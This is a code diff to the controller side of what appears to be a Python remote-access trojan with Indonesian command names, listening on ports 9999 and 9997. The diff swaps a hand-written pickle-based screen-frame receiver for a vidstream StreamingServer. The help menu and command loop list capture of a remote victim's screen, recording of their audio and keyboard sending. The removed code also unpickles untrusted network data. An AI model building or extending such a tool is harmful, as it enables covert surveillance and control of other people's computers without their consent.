@@ -9,7 +9,8 @@ import wave
 import pyaudio
 import pyfiglet
 import random
-from colorama import Fore, Back
+from colorama import Fore
+from vidstream import StreamingServer
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 soc.bind(('0.0.0.0', 9999))
@@ -67,40 +68,14 @@ def receive_and_save():
           print(e)
      
 def konversi_byte_screen_recorder():
-     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     sock.bind(('0.0.0.0', 9997))
-     sock.listen(1)
-     konek = sock.accept()
-     tg = konek[0]
-     ip = konek[1]
+     receive = StreamingServer('0.0.0.0', 9997)
 
-     bdata = b""
-     payload_size = struct.calcsize("i")
-
-     while True:
-          while(len(bdata)) < payload_size: 
-               packet = tg.recv(1024)
-               if not packet: break
-               bdata += packet
-
-               packed_msg_size = bdata[:payload_size]
-               bdata = bdata[payload_size:]
-               msg_size = struct.unpack("i", packed_msg_size)[0]
-               while len(bdata) < msg_size:
-                    bdata += tg.recv(1024)
-               frame_data = bdata[:msg_size]
-               bdata =  bdata[msg_size:]
-               frame = pickle.loads(frame_data)
-               cv2.imshow("recording", frame)
-               key = cv2.waitKey(1)
-               if key == 27:
-                    break
-          tg.close()
-          cv2.destroyAllWindows()
-
-def record_screen():
-     t = threading.Thread(target=konversi_byte_screen_recorder)
+     t = threading.Thread(target=receive.start_server)
      t.start()
+
+     while input("") != 'stop':
+          continue
+     receive.stop_server()
 
 def konversi_byte_stream():
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -109,7 +84,7 @@ def konversi_byte_stream():
      konek = sock.accept()
      tg = konek[0]
      ip = konek[1]
-
+     print(f'connected {ip}')
      bdata = b""
      payload_size = struct.calcsize("Q")
      while True:
@@ -207,7 +182,7 @@ def shellc():
              _target.settimeout(None)
              file.close()
         elif perintah == 'screensr':
-             record_screen()
+             konversi_byte_screen_recorder()
         elif perintah == 'help':
              print(Fore.BLUE+"""
                    -exit/quit >> keluar
@@ -238,6 +213,7 @@ def shellc():
                    -send      >> mengirimkan keyboard
 
                    -banner    >> baner
+                   
                    """)
         elif perintah == 'rec_audio':
              receive_and_save()
